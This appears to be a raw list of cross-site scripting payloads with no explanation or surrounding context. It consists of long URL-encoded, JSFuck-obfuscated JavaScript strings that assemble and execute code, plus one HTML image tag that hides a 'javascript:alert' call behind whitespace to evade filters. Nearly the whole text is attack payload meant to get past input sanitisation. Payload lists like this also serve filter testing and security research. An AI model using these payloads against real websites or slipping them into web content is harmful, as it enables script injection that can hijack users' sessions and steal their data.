29%5B%2B%21%2B%5B%5D%5D%2B%28%21%21%5B%5D%2B%5B%5D%29%5B%2B%5B%5D%5D%5D%2B%5B%5D%29%5B%21%2B%5B%5D%2B%21%2B%5B%5D%2B%21%2B%5B%5D%5D%2B%28%21%21%5B%5D%2B%5B%5D%29%5B%2B%21%2B%5B%5D%5D%2B%28%5B%21%5B%5D%5D%2B%5B%5D%5B%5B%5D%5D%29%5B%2B%21%2B%5B%5D%2B%5B%2B%5B%5D%5D%5D%2B%28%2B%28%21%2B%5B%5D%2B%21%2B%5B%5D%2B%5B%2B%21%2B%5B%5D%5D%2B%5B%2B%21%2B%5B%5D%5D%29%29%5B%28%21%21%5B%5D%2B%5B%5D%29%5B%2B%5B%5D%5D%2B%28%21%21%5B%5D%2B%5B%5D%5B%28%21%5B%5D%2B%5B%5D%29%5B%2B%5B%5D%5D%2B%28%21%5B%5D%2B%5B%5D%29%5B%21%2B%5B%5D%2B%21%2B%5B%5D%5D%2B%28%21%5B%5D%2B%5B%5D%29%5B%2B%21%2B%5B%5D%5D%2B%28%21%21%5B%5D%2B%5B%5D%29%5B%2B%5B%5D%5D%5D%29%5B%2B%21%2B%5B%5D%2B%5B%2B%5B%5D%5D%5D%2B%28%5B%5D%2B%5B%5D%29%5B%28%5B%5D%5B%28%21%5B%5D%2B%5B%5D%29%5B%2B%5B%5D%5D%2B%28%21%5B%5D%2B%5B%5D%29%5B%21%2B%5B%5D%2B%21%2B%5B%5D%5D%2B%28%21%5B%5D%2B%5B%5D%29%5B%2B%21%2B%5B%5D%5D%2B%28%21%21%5B%5D%2B%5B%5D%29%5B%2B%5B%5D%5D%5D%2B%5B%5D%29%5B%21%2B%5B%5D%2B%21%2B%5B%5D%2B%21%2B%5B%5D%5D%2B%28%21%21%5B%5D%2B%5B%5D%5B%28%21%5B%5D%2B%5B%5D%29%5B%2B%5B%5D%5D%2B%28%21%5B%5D%2B%5B%5D%29%5B%21%2B%5B%5D%2B%21%2B%5B%5D%5D%2B%28%21%5B%5D%2B%5B%5D%29%5B%2B%21%2B%5B%5D%5D%2B%28%21%21%5B%5D%2B%5B%5D%29%5B%2B%5B%5D%5D%5D%29%5B%2B%21%2B%5B%5D%2B%5B%2B%5B%5D%5D%5D%2B%28%5B%5D%5B%5B%5D%5D%2B%5B%5D%29%5B%2B%21%2B%5B%5D%5D%2B%28%21%5B%5D%2B%5B%5D%29%5B%21%2B%5B%5D%2B%21%2B%5B%5D%2B%21%2B%5B%5D%5D%2B%28%21%21%5B%5D%2B%5B%5D%29%5B%2B%5B%5D%5D%2B%28%21%21%5B%5D%2B%5B%5D%29%5B%2B%21%2B%5B%5D%5D%2B%28%5B%5D%5B%5B%5D%5D%2B%5B%5D%29%5B%2B%5B%5D%5D%2B%28%5B%5D%5B%28%21%5B%5D%2B%5B%5D%29%5B%2B%5B%5D%5D%2B%28%21%5B%5D%2B%5B%5D%29%5B%21%2B%5B%5D%2B%21%2B%5B%5D%5D%2B%28%21%5B%5D%2B%5B%5D%29%5B%2B%21%2B%5B%5D%5D%2B%28%21%21%5B%5D%2B%5B%5D%29%5B%2B%5B%5D%5D%5D%2B%5B%5D%29%5B%21%2B%5B%5D%2B%21%2B%5B%5D%2B%21%2B%5B%5D%5D%2B%28%21%21%5B%5D%2B%5B%5D%29%5B%2B%5B%5D%5D%2B%28%21%21%5B%5D%2B%5B%5D%5B%28%21%5B%5D%2B%5B%5D%29%5B%2B%5B%5D%5D%2B%28%21%5B%5D%2B%5B%5D%29%5B%21%2B%5B%5D%2B%21%2B%5B%5D%5D%2B%28%21%5B%5D%2B%5B%5D%29%5B%2B%21%2B%5B%5D%5D%2B%28%21%21%5B%5D%2B%5B%5D%29%5B%2B%5B%5D%5D%5D%29%5B%2B%21%2B%5B%5D%2B%5B%2B%5B%5D%5D%5D%2B%28%21%21%5B%5D%2B%5B%5D%29%5B%2B%21%2B%5B%5D%5D%5D%5B%28%5B%5D%5B%5B%5D%5D%2B%5B%5D%29%5B%2B%21%2B%5B%5D%5D%2B%28%21%5B%5D%2B%5B%5D%29%5B%2B%21%2B%5B%5D%5D%2B%28%28%2B%5B%5D%29%5B%28%5B%5D%5B%28%21%5B%5D%2B%5B%5D%29%5B%2B%5B%5D%5D%2B%28%21%5B%5D%2B%5B%5D%29%5B%21%2B%5B%5D%2B%21%2B%5B%5D%5D%2B%28%21%5B%5D%2B%5B%5D%29%5B%2B%21%2B%5B%5D%5D%2B%28%21%21%5B%5D%2B%5B%5D%29%5B%2B%5B%5D%5D%5D%2B%5B%5D%29%5B%21%2B%5B%5D%2B%21%2B%5B%5D%2B%21%2B%5B%5D%5D%2B%28%21%21%5B%5D%2B%5B%5D%5B%28%21%5B%5D%2B%5B%5D%29%5B%2B%5B%5D%5D%2B%28%21%5B%5D%2B%5B%5D%29%5B%21%2B%5B%5D%2B%21%2B%5B%5D%5D%2B%28%21%5B%5D%2B%5B%5D%29%5B%2B%21%2B%5B%5D%5D%2B%28%21%21%5B%5D%2B%5B%5D%29%5B%2B%5B%5D%5D%5D%29%5B%2B%21%2B%5B%5D%2B%5B%2B%5B%5D%5D%5D%2B%28%5B%5D%5B%5B%5D%5D%2B%5B%5D%29%5B%2B%21%2B%5B%5D%5D%2B%28%21%5B%5D%2B%5B%5D%29%5B%21%2B%5B%5D%2B%21%2B%5B%5D%2B%21%2B%5B%5D%5D%2B%28%21%21%5B%5D%2B%5B%5D%29%5B%2B%5B%5D%5D%2B%28%21%21%5B%5D%2B%5B%5D%29%5B%2B%21%2B%5B%5D%5D%2B%28%5B%5D%5B%5B%5D%5D%2B%5B%5D%29%5B%2B%5B%5D%5D%2B%28%5B%5D%5B%28%21%5B%5D%2B%5B%5D%29%5B%2B%5B%5D%5D%2B%28%21%5B%5D%2B%5B%5D%29%5B%21%2B%5B%5D%2B%21%2B%5B%5D%5D%2B%28%21%5B%5D%2B%5B%5D%29%5B%2B%21%2B%5B%5D%5D%2B%28%21%21%5B%5D%2B%5B%5D%29%5B%2B%5B%5D%5D%5D%2B%5B%5D%29%5B%21%2B%5B%5D%2B%21%2B%5B%5D%2B%21%2B%5B%5D%5D%2B%28%21%21%5B%5D%2B%5B%5D%29%5B%2B%5B%5D%5D%2B%28%21%21%5B%5D%2B%5B%5D%5B%28%21%5B%5D%2B%5B%5D%29%5B%2B%5B%5D%5D%2B%28%21%5B%5D%2B%5B%5D%29%5B%21%2B%5B%5D%2B%21%2B%5B%5D%5D%2B%28%21%5B%5D%2B%5B%5D%29%5B%2B%21%2B%5B%5D%5D%2B%28%21%21%5B%5D%2B%5B%5D%29%5B%2B%5B%5D%5D%5D%29%5B%2B%21%2B%5B%5D%2B%5B%2B%5B%5D%5D%5D%2B%28%21%21%5B%5D%2B%5B%5D%29%5B%2B%21%2B%5B%5D%5D%5D%2B%5B%5D%29%5B%2B%21%2B%5B%5D%2B%5B%2B%21%2B%5B%5D%5D%5D%2B%28%21%21%5B%5D%2B%5B%5D%29%5B%21%2B%5B%5D%2B%21%2B%5B%5D%2B%21%2B%5B%5D%5D%5D%5D%28%21%2B%5B%5D%2B%21%2B%5B%5D%2B%21%2B%5B%5D%2B%5B%2B%21%2B%5B%5D%5D%29%5B%2B%21%2B%5B%5D%5D%2B%28%21%21%5B%5D%2B%5B%5D%29%5B%2B%5B%5D%5D%2B%28%5B%5D%5B%28%21%5B%5D%2B%5B%5D%29%5B%2B%5B%5D%5D%2B%28%21%5B%5D%2B%5B%5D%29%5B%21%2B%5B%5D%2B%21%2B%5B%5D%5D%2B%28%21%5B%5D%2B%5B%5D%29%5B%2B%21%2B%5B%5D%5D%2B%28%21%21%5B%5D%2B%5B%5D%29%5B%2B%5B%5D%5D%5D%5B%28%5B%5D%5B%28%21%5B%5D%2B%5B%5D%29%5B%2B%5B%5D%5D%2B%28%21%5B%5D%2B%5B%5D%29%5B%21%2B%5B%5D%2B%21%2B%5B%5D%5D%2B%28%21%5B%5D%2B%5B%5D%29%5B%2B%21%2B%5B%5D%5D%2B%28%21%21%5B%5D%2B%5B%5D%29%5B%2B%5B%5D%5D%5D%2B%5B%5D%29%5B%21%2B%5B%5D%2B%21%2B%5B%5D%2B%21%2B%5B%5D%5D%2B%28%21%21%5B%5D%2B%5B%5D%5B%28%21%5B%5D%2B%5B%5D%29%5B%2B%5B%5D%5D%2B%28%21%5B%5D%2B%5B%5D%29%5B%21%2B%5B%5D%2B%21%2B%5B%5D%5D%2B%28%21%5B%5D%2B%5B%5D%29%5B%2B%21%2B%5B%5D%5D%2B%28%21%21%5B%5D%2B%5B%5D%29%5B%2B%5B%5D%5D%5D%29%5B%2B%21%2B%5B%5D%2B%5B%2B%5B%5D%5D%5D%2B%28%5B%5D%5B%5B%5D%5D%2B%5B%5D%29%5B%2B%21%2B%5B%5D%5D%2B%28%21%5B%5D%2B%5B%5D%29%5B%21%2B%5B%5D%2B%21%2B%5B%5D%2B%21%2B%5B%5D%5D%2B%28%21%21%5B%5D%2B%5B%5D%29%5B%2B%5B%5D%5D%2B%28%21%21%5B%5D%2B%5B%5D%29%5B%2B%21%2B%5B%5D%5D%2B%28%5B%5D%5B%5B%5D%5D%2B%5B%5D%29%5B%2B%5B%5D%5D%2B%28%5B%5D%5B%28%21%5B%5D%2B%5B%5D%29%5B%2B%5B%5D%5D%2B%28%21%5B%5D%2B%5B%5D%29%5B%21%2B%5B%5D%2B%21%2B%5B%5D%5D%2B%28%21%5B%5D%2B%5B%5D%29%5B%2B%21%2B%5B%5D%5D%2B%28%21%21%5B%5D%2B%5B%5D%29%5B%2B%5B%5D%5D%5D%2B%5B%5D%29%5B%21%2B%5B%5D%2B%21%2B%5B%5D%2B%21%2B%5B%5D%5D%2B%28%21%21%5B%5D%2B%5B%5D%29%5B%2B%5B%5D%5D%2B%28%21%21%5B%5D%2B%5B%5D%5B%28%21%5B%5D%2B%5B%5D%29%5B%2B%5B%5D%5D%2B%28%21%5B%5D%2B%5B%5D%29%5B%21%2B%5B%5D%2B%21%2B%5B%5D%5D%2B%28%21%5B%5D%2B%5B%5D%29%5B%2B%21%2B%5B%5D%5D%2B%28%21%21%5B%5D%2B%5B%5D%29%5B%2B%5B%5D%5D%5D%29%5B%2B%21%2B%5B%5D%2B%5B%2B%5B%5D%5D%5D%2B%28%21%21%5B%5D%2B%5B%5D%29%5B%2B%21%2B%5B%5D%5D%5D%28%28%21%21%5B%5D%2B%5B%5D%29%5B%2B%21%2B%5B%5D%5D%2B%28%21%21%5B%5D%2B%5B%5D%29%5B%21%2B%5B%5D%2B%21%2B%5B%5D%2B%21%2B%5B%5D%5D%2B%28%21%21%5B%5D%2B%5B%5D%29%5B%2B%5B%5D%5D%2B%28%5B%5D%5B%5B%5D%5D%2B%5B%5D%29%5B%2B%5B%5D%5D%2B%28%21%21%5B%5D%2B%5B%5D%29%5B%2B%21%2B%5B%5D%5D%2B%28%5B%5D%5B%5B%5D%5D%2B%5B%5D%29%5B%2B%21%2B%5B%5D%5D%2B%28%21%5B%5D%2B%5B%2B%5B%5D%5D%29%5B%28%5B%21%5B%5D%5D%2B%5B%5D%5B%5B%5D%5D%29%5B%2B%21%2B%5B%5D%2B%5B%2B%5B%5D%5D%5D%2B%28%21%21%5B%5D%2B%5B%5D%29%5B%2B%5B%5D%5D%2B%28%21%5B%5D%2B%5B%5D%29%5B%2B%21%2B%5B%5D%5D%2B%28%21%5B%5D%2B%5B%5D%29%5B%21%2B%5B%5D%2B%21%2B%5B%5D%5D%2B%28%5B%21%5B%5D%5D%2B%5B%5D%5B%5B%5D%5D%29%5B%2B%21%2B%5B%5D%2B%5B%2B%5B%5D%5D%5D%2B%28%5B%5D%5B%28%21%5B%5D%2B%5B%5D%29%5B%2B%5B%5D%5D%2B%28%21%5B%5D%2B%5B%5D%29%5B%21%2B%5B%5D%2B%21%2B%5B%5D%5D%2B%28%21%5B%5D%2B%5B%5D%29%5B%2B%21%2B%5B%5D%5D%2B%28%21%21%5B%5D%2B%5B%5D%29%5B%2B%5B%5D%5D%5D%2B%5B%5D%29%5B%21%2B%5B%5D%2B%21%2B%5B%5D%2B%21%2B%5B%5D%5D%2B%28%21%5B%5D%2B%5B%5D%29%5B%21%2B%5B%5D%2B%21%2B%5B%5D%2B%21%2B%5B%5D%5D%5D%28%29%5B%2B%21%2B%5B%5D%2B%5B%2B%5B%5D%5D%5D%2B%21%5B%5D%2B%28%21%5B%5D%2B%5B%2B%5B%5D%5D%29%5B%28%5B%21%5B%5D%5D%2B%5B%5D%5B%5B%5D%5D%29%5B%2B%21%2B%5B%5D%2B%5B%2B%5B%5D%5D%5D%2B%28%21%21%5B%5D%2B%5B%5D%29%5B%2B%5B%5D%5D%2B%28%21%5B%5D%2B%5B%5D%29%5B%2B%21%2B%5B%5D%5D%2B%28%21%5B%5D%2B%5B%5D%29%5B%21%2B%5B%5D%2B%21%2B%5B%5D%5D%2B%28%5B%21%5B%5D%5D%2B%5B%5D%5B%5B%5D%5D%29%5B%2B%21%2B%5B%5D%2B%5B%2B%5B%5D%5D%5D%2B%28%5B%5D%5B%28%21%5B%5D%2B%5B%5D%29%5B%2B%5B%5D%5D%2B%28%21%5B%5D%2B%5B%5D%29%5B%21%2B%5B%5D%2B%21%2B%5B%5D%5D%2B%28%21%5B%5D%2B%5B%5D%29%5B%2B%21%2B%5B%5D%5D%2B%28%21%21%5B%5D%2B%5B%5D%29%5B%2B%5B%5D%5D%5D%2B%5B%5D%29%5B%21%2B%5B%5D%2B%21%2B%5B%5D%2B%21%2B%5B%5D%5D%2B%28%21%5B%5D%2B%5B%5D%29%5B%21%2B%5B%5D%2B%21%2B%5B%5D%2B%21%2B%5B%5D%5D%5D%28%29%5B%2B%21%2B%5B%5D%2B%5B%2B%5B%5D%5D%5D%29%28%29%5B%28%5B%5D%5B%28%21%5B%5D%2B%5B%5D%29%5B%2B%5B%5D%5D%2B%28%21%5B%5D%2B%5B%5D%29%5B%21%2B%5B%5D%2B%21%2B%5B%5D%5D%2B%28%21%5B%5D%2B%5B%5D%29%5B%2B%21%2B%5B%5D%5D%2B%28%21%21%5B%5D%2B%5B%5D%29%5B%2B%5B%5D%5D%5D%2B%5B%5D%29%5B%21%2B%5B%5D%2B%21%2B%5B%5D%2B%21%2B%5B%5D%5D%2B%28%21%21%5B%5D%2B%5B%5D%5B%28%21%5B%5D%2B%5B%5D%29%5B%2B%5B%5D%5D%2B%28%21%5B%5D%2B%5B%5D%29%5B%21%2B%5B%5D%2B%21%2B%5B%5D%5D%2B%28%21%5B%5D%2B%5B%5D%29%5B%2B%21%2B%5B%5D%5D%2B%28%21%21%5B%5D%2B%5B%5D%29%5B%2B%5B%5D%5D%5D%29%5B%2B%21%2B%5B%5D%2B%5B%2B%5B%5D%5D%5D%2B%28%5B%5D%5B%5B%5D%5D%2B%5B%5D%29%5B%2B%21%2B%5B%5D%5D%2B%28%21%5B%5D%2B%5B%5D%29%5B%21%2B%5B%5D%2B%21%2B%5B%5D%2B%21%2B%5B%5D%5D%2B%28%21%21%5B%5D%2B%5B%5D%29%5B%2B%5B%5D%5D%2B%28%21%21%5B%5D%2B%5B%5D%29%5B%2B%21%2B%5B%5D%5D%2B%28%5B%5D%5B%5B%5D%5D%2B%5B%5D%29%5B%2B%5B%5D%5D%2B%28%5B%5D%5B%28%21%5B%5D%2B%5B%5D%29%5B%2B%5B%5D%5D%2B%28%21%5B%5D%2B%5B%5D%29%5B%21%2B%5B%5D%2B%21%2B%5B%5D%5D%2B%28%21%5B%5D%2B%5B%5D%29%5B%2B%21%2B%5B%5D%5D%2B%28%21%21%5B%5D%2B%5B%5D%29%5B%2B%5B%5D%5D%5D%2B%5B%5D%29%5B%21%2B%5B%5D%2B%21%2B%5B%5D%2B%21%2B%5B%5D%5D%2B%28%21%21%5B%5D%2B%5B%5D%29%5B%2B%5B%5D%5D%2B%28%21%21%5B%5D%2B%5B%5D%5B%28%21%5B%5D%2B%5B%5D%29%5B%2B%5B%5D%5D%2B%28%21%5B%5D%2B%5B%5D%29%5B%21%2B%5B%5D%2B%21%2B%5B%5D%5D%2B%28%21%5B%5D%2B%5B%5D%29%5B%2B%21%2B%5B%5D%5D%2B%28%21%21%5B%5D%2B%5B%5D%29%5B%2B%5B%5D%5D%5D%29%5B%2B%21%2B%5B%5D%2B%5B%2B%5B%5D%5D%5D%2B%28%21%21%5B%5D%2B%5B%5D%29%5B%2B%21%2B%5B%5D%5D%5D%28%29%2B%5B%5D%29%5B%21%2B%5B%5D%2B%21%2B%5B%5D%2B%21%2B%5B%5D%5D%2B%28%21%5B%5D%2B%5B%5D%29%5B%2B%21%2B%5B%5D%5D%2B%28%21%5B%5D%2B%5B%5D%29%5B%21%2B%5B%5D%2B%21%2B%5B%5D%5D%2B%28%21%21%5B%5D%2B%5B%5D%29%5B%21%2B%5B%5D%2B%21%2B%5B%5D%2B%21%2B%5B%5D%5D%2B%28%21%21%5B%5D%2B%5B%5D%29%5B%2B%21%2B%5B%5D%5D%2B%28%21%21%5B%5D%2B%5B%5D%29%5B%2B%5B%5D%5D%2B%28%5B%5D%5B%28%21%5B%5D%2B%5B%5D%29%5B%2B%5B%5D%5D%2B%28%21%5B%5D%2B%5B%5D%29%5B%21%2B%5B%5D%2B%21%2B%5B%5D%5D%2B%28%21%5B%5D%2B%5B%5D%29%5B%2B%21%2B%5B%5D%5D%2B%28%21%21%5B%5D%2B%5B%5D%29%5B%2B%5B%5D%5D%5D%2B%5B%5D%29%5B%2B%21%2B%5B%5D%2B%5B%21%2B%5B%5D%2B%21%2B%5B%5D%2B%21%2B%5B%5D%5D%5D%2B%5B%2B%21%2B%5B%5D%5D%2B%5B%21%2B%5B%5D%2B%21%2B%5B%5D%2B%21%2B%5B%5D%5D%2B%5B%21%2B%5B%5D%2B%21%2B%5B%5D%2B%21%2B%5B%5D%5D%2B%5B%21%2B%5B%5D%2B%21%2B%5B%5D%2B%21%2B%5B%5D%2B%21%2B%5B%5D%2B%21%2B%5B%5D%2B%21%2B%5B%5D%2B%21%2B%5B%5D%5D%2B%28%5B%2B%5B%5D%5D%2B%21%5B%5D%2B%5B%5D%5B%28%21%5B%5D%2B%5B%5D%29%5B%2B%5B%5D%5D%2B%28%21%5B%5D%2B%5B%5D%29%5B%21%2B%5B%5D%2B%21%2B%5B%5D%5D%2B%28%21%5B%5D%2B%5B%5D%29%5B%2B%21%2B%5B%5D%5D%2B%28%21%21%5B%5D%2B%5B%5D%29%5B%2B%5B%5D%5D%5D%29%5B%21%2B%5B%5D%2B%21%2B%5B%5D%2B%5B%2B%5B%5D%5D%5D%29
 <IMG SRC="jav   ascript:alert('XSS');">
-%5B%5D%5B%28%21%5B%5D%2B%5B%5D%29%5B%2B%5B%5D%5D%2B%28%21%5B%5D%2B%5B%5D%29%5B%21%2B%5B%5D%2B%21%2B%5B%5D%5D%2B%28%21%5B%5D%2B%5B%5D%29%5B%2B%21%2B%5B%5D%5D%2B%28%21%21%5B%5D%2B%5B%5D%29%5B%2B%5B%5D%5D%5D%5B%28%5B%5D%5B%28%21%5B%5D%2B%5B%5D%29%5B%2B%5B%5D%5D%2B%28%21%5B%5D%2B%5B%5D%29%5B%21%2B%5B%5D%2B%21%2B%5B%5D%5D%2B%28%21%5B%5D%2B%5B%5D%29%5B%2B%21%2B%5B%5D%5D%2B%28%21%21%5B%5D%2B%5B%5D%29%5B%2B%5B%5D%5D%5D%2B%5B%5D%29%5B%21%2B%5B%5D%2B%21%2B%5B%5D%2B%21%2B%5B%5D%5D%2B%28%21%21%5B%5D%2B%5B%5D%5B%28%21%5B%5D%2B%5B%5D%29%5B%2B%5B%5D%5D%2B%28%21%5B%5D%2B%5B%5D%29%5B%21%2B%5B%5D%2B%21%2B%5B%5D%5D%2B%28%21%5B%5D%2B%5B%5D%29%5B%2B%21%2B%5B%5D%5D%2B%28%21%21%5B%5D%2B%5B%5D%29%5B%2B%5B%5D%5D%5D%29%5B%2B%21%2B%5B%5D%2B%5B%2B%5B%5D%5D%5D%2B%28%5B%5D%5B%5B%5D%5D%2B%5B%5D%29%5B%2B%21%2B%5B%5D%5D%2B%28%21%5B%5D%2B%5B%5D%29%5B%21%2B%5B%5D%2B%21%2B%5B%5D%2B%21%2B%5B%5D%5D%2B%28%21%21%5B%5D%2B%5B%5D%29%5B%2B%5B%5D%5D%2B%28%21%21%5B%5D%2B%5B%5D%29%5B%2B%21%2B%5B%5D%5D%2B%28%5B%5D%5B%5B%5D%5D%2B%5B%5D%29%5B%2B%5B%5D%5D%2B%28%5B%5D%5B%28%21%5B%5D%2B%5B%5D%29%5B%2B%5B%5D%5D%2B%28%21%5B%5D%2B%5B%5D%29%5B%21%2B%5B%5D%2B%21%2B%5B%5D%5D%2B%28%21%5B%5D%2B%5B%5D%29%5B%2B%21%2B%5B%5D%5D%2B%28%21%21%5B%5D%2B%5B%5D%29%5B%2B%5B%5D%5D%5D%2B%5B%5D%29%5B%21%2B%5B%5D%2B%21%2B%5B%5D%2B%21%2B%5B%5D%5D%2B%28%21%21%5B%5D%2B%5B%5D%29%5B%2B%5B%5D%5D%2B%28%21%21%5B%5D%2B%5B%5D%5B%28%21%5B%5D%2B%5B%5D%29%5B%2B%5B%5D%5D%2B%28%21%5B%5D%2B%5B%5D%29%5B%21%2B%5B%5D%2B%21%2B%5B%5D%5D%2B%28%21%5B%5D%2B%5B%5D%29%5B%2B%21%2B%5B%5D%5D%2B%28%21%21%5B%5D%2B%5B%5D%29%5B%2B%5B%5D%5D%5D%29%5B%2B%21%2B%5B%5D%2B%5B%2B%5B%5D%5D%5D%2B%28%21%21%5B%5D%2B%5B%5D%29%5B%2B%21%2B%5B%5D%5D%5D%28%28%21%21%5B%5D%2B%5B%5D%29%5B%2B%21%2B%5B%5D%5D%2B%28%21%21%5B%5D%2B%5B%5D%29%5B%21%2B%5B%5D%2B%21%2B%5B%5D%2B%21%2B%5B%5D%5D%2B%28%21%21%5B%5D%2B%5B%5D%29%5B%2B%5B%5D%5D%2B%28%5B%5D%5B%5B%5D%5D%2B%5B%5D%29%5B%2B%5B%5D%5D%2B%28%21%21%5B%5D%2B%5B%5D%29%5B%2B%21%2B%5B%5D%5D%2B%28%5B%5D%5B%5B%5D%5D%2B%5B%5D%29%5B%2B%21%2B%5B%5D%5D%2B%28%2B%5B%21%5B%5D%5D%2B%5B%5D%5B%28%21%5B%5D%2B%5B%5D%29%5B%2B%5B%5D%5D%2B%28%21%5B%5D%2B%5B%5D%29%5B%21%2B%5B%5D%2B%21%2B%5B%5D%5D%2B%28%21%5B%5D%2B%5B%5D%29%5B%2B%21%2B%5B%5D%5D%2B%28%21%21%5B%5D%2B%5B%5D%29%5B%2B%5B%5D%5D%5D%29%5B%2B%21%2B%5B%5D%2B%5B%2B%21%2B%5B%5D%5D%5D%2B%28%21%21%5B%5D%2B%5B%5D%29%5B%21%2B%5B%5D%2B%21%2B%5B%5D%2B%21%2B%5B%5D%5D%2B%28%2B%28%21%2B%5B%5D%2B%21%2B%5B%5D%2B%21%2B%5B%5D%2B%5B%2B%21%2B%5B%5D%5D%29%29%5B%28%21%21%5B%5D%2B%5B%5D%29%5B%2B%5B%5D%5D%2B%28%21%21%5B%5D%2B%5B%5D%5B%28%21%5B%5D%2B%5B%5D%29%5B%2B%5B%5D%5D%2B%28%21%5B%5D%2B%5B%5D%29%5B%21%2B%5B%5D%2B%21%2B%5B%5D%5D%2B%28%21%5B%5D%2B%5B%5D%29%5B%2B%21%2B%5B%5D%5D%2B%28%21%21%5B%5D%2B%5B%5D%29%5B%2B%5B%5D%5D%5D%29%5B%2B%21%2B%5B%5D%2B%5B%2B%5B%5D%5D%5D%2B%28%5B%5D%2B%5B%5D%29%5B%28%5B%5D%5B%28%21%5B%5D%2B%5B%5D%29%5B%2B%5B%5D%5D%2B%28%21%5B%5D%2B%5B%5D%29%5B%21%2B%5B%5D%2B%21%2B%5B%5D%5D%2B%28%21%5B%5D%2B%5B%5D%29%5B%2B%21%2B%5B%5D%5D%2B%28%21%21%5B%5D%2B%5B%5D%29%5B%2B%5B%5D%5D%5D%2B%5B%5D%29%5B%21%2B%5B%5D%2B%21%2B%5B%5D%2B%21%2B%5B%5D%5D%2B%28%21%21%5B%5D%2B%5B%5D%5B%28%21%5B%5D%2B%5B%5D%29%5B%2B%5B%5D%5D%2B%28%21%5B%5D%2B%5B%5D%29%5B%21%2B%5B%5D%2B%21%2B%5B%5D%5D%2B%28%21%5B%5D%2B%5B%5D%29%5B%2B%21%2B%5B%5D%5D%2B%28%21%21%5B%5D%2B%5B%5D%29%5B%2B%5B%5D%5D%5D%29%5B%2B%21%2B%5B%5D%2B%5B%2B%5B%5D%5D%5D%2B%28%5B%5D%5B%5B%5D%5D%2B%5B%5D%29%5B%2B%21%2B%5B%5D%5D%2B%28%21%5B%5D%2B%5B%5D%29%5B%21%2B%5B%5D%2B%21%2B%5B%5D%2B%21%2B%5B%5D%5D%2B%28%21%21%5B%5D%2B%5B%5D%29%5B%2B%5B%5D%5D%2B%28%21%21%5B%5D%2B%5B%5D%29%5B%2B%21%2B%5B%5D%5D%2B%28%5B%5D%5B%5B%5D%5D%2B%5B%5D%29%5B%2B%5B%5D%5D%2B%28%5B%5D%5B%28%21%5B%5D%2B%5B%5D%29%5B%2B%5B%5D%5D%2B%28%21%5B%5D%2B%5B%5D%29%5B%21%2B%5B%5D%2B%21%2B%5B%5D%5D%2B%28%21%5B%5D%2B%5B%5D%29%5B%2B%21%2B%5B%5D%5D%2B%28%21%21%5B%5D%2B%5B%5D%29%5B%2B%5B%5D%5D%5D%2B%5B%5D%29%5B%21%2B%5B%5D%2B%21%2B%5B%5D%2B%21%2B%5B%5D%5D%2B%28%21%21%5B%5D%2B%5B%5D%29%5B%2B%5B%5D%5D%2B%28%21%21%5B%5D%2B%5B%5D%5B%28%21%5B%5D%2B%5B%5D%29%5B%2B%5B%5D%5D%2B%28%21%5B%5D%2B%5B%5D%29%5B%21%2B%5B%5D%2B%21%2B%5B%5D%5D%2B%28%21%5B%5D%2B%5B%5D%29%5B%2B%21%2B%5B%5D%5D%2B%28%21%21%5B%5D%2B%5B%5D%29%5B%2B%5B%5D%5D%5D%29%5B%2B%21%2B%5B%5D%2B%5B%2B%5B%5D%5D%5D%2B%28%21%21%5B%5D%2B%5B%5D%29%5B%2B%21%2B%5B%5D%5D%5D%5B%28%5B%5D%5B%5B%5D%5D%2B%5B%5D%29%5B%2B%21%2B%5B%5D%5D%2B%28%21%5B%5D%2B%5B%5D%29%5B%2B%21%2B%5B%5D%5D%2B%28%28%2B%5B%5D%29%5B%28%5B%5D%5B%28%21%5B%5D%2B%5B%5D%29%5B%2B%5B%5D%5D%2B%28%21%5B%5D%2B%5B%5D%29%5B%21%2B%5B%5D%2B%21%2B%5B%5D%5D%2B%28%21%5B%5D%2B%5B%5D%29%5B%2B%21%2B%5B%5D%5D%2B%28%21%21%5B%5D%2B%5B%5D%29%5B%2B%5B%5D%5D%5D%2B%5B%5D%29%5B%21%2B%5B%5D%2B%21%2B%5B%5D%2B%21%2B%5B%5D%5D%2B%28%21%21%5B%5D%2B%5B%5D%5B%28%21%5B%5D%2B%5B%5D%29%5B%2B%5B%5D%5D%2B%28%21%5B%5D%2B%5B%5D%29%5B%21%2B%5B%5D%2B%21%2B%5B%5D%5D%2B%28%21%5B%5D%2B%5B%5D%29%5B%2B%21%2B%5B%5D%5D%2B%28%21%21%5B%5D%2B%5B%5D%29%5B%2B%5B%5D%5D%5D%29%5B%2B%21%2B%5B%5D%2B%5B%2B%5B%5D%5D%5D%2B%28%5B%5D%5B%5B%5D%5D%2B%5B%5D%29%5B%2B%21%2B%5B%5D%5D%2B%28%21%5B%5D%2B%5B%5D%29%5B%21%2B%5B%5D%2B%21%2B%5B%5D%2B%21%2B%5B%5D%5D%2B%28%21%21%5B%5D%2B%5B%5D%29%5B%2B%5B%5D%5D%2B%28%21%21%5B%5D%2B%5B%5D%29%5B%2B%21%2B%5B%5D%5D%2B%28%5B%5D%5B%5B%5D%5D%2B%5B%5D%29%5B%2B%5B%5D%5D%2B%28%5B%5D%5B%28%21%5B%5D%2B%5B%5D%29%5B%2B%5B%5D%5D%2B%28%21%5B%5D%2B%5B%5D%29%5B%21%2B%5B%5D%2B%21%2B%5B%5D%5D%2B%28%21%5B%5D%2B%5B%5D%29%5B%2B%21%2B%5B%5D%5D%2B%28%21%21%5B%5D%2B%5B%5D%29%5B%2B%5B%5D%5D%5D%2B%5B%5D%29%5B%21%2B%5B%5D%2B%21%2B%5B%5D%2B%21%2B%5B%5D%5D%2B%28%21%21%5B%5D%2B%5B%5D%29%5B%2B%5B%5D%5D%2B%28%21%21%5B%5D%2B%5B%5D%5B%28%21%5B%5D%2B%5B%5D%29%5B%2B%5B%5D%5D%2B%28%21%5B%5D%2B%5B%5D%29%5B%21%2B%5B%5D%2B%21%2B%5B%5D%5D%2B%28%21%5B%5D%2B%5B%5D%29%5B%2B%21%2B%5B%5D%5D%2B%28%21%21%5B%5D%2B%5B%5D%29%5B%2B%5B%5D%5D%5D%29%5B%2B%21%2B%5B%5D%2B%5B%2B%5B%5D%5D%5D%2B%28%21%21%5B%5D%2B%5B%5D%29%5B%2B%21%2B%5B%5D%5D%5D%2B%5B%5D%29%5B%2B%21%2B%5B%5D%2B%5B%2B%21%2B%5B%5D%5D%5D%2B%28%21%21%5B%5D%2B%5B%5D%29%5B%21%2B%5B%5D%2B%21%2B%5B%5D%2B%21%2B%5B%5D%5D%5D%5D%28%21%2B%5B%5D%2B%21%2B%5B%5D%2B%21%2B%5B%5D%2B%5B%21%2B%5B%5D%2B%21%2B%5B%5D%5D%29%2B%28%21%5B%5D%2B%5B%5D%29%5B%2B%21%2B%5B%5D%5D%2B%28%21%5B%5D%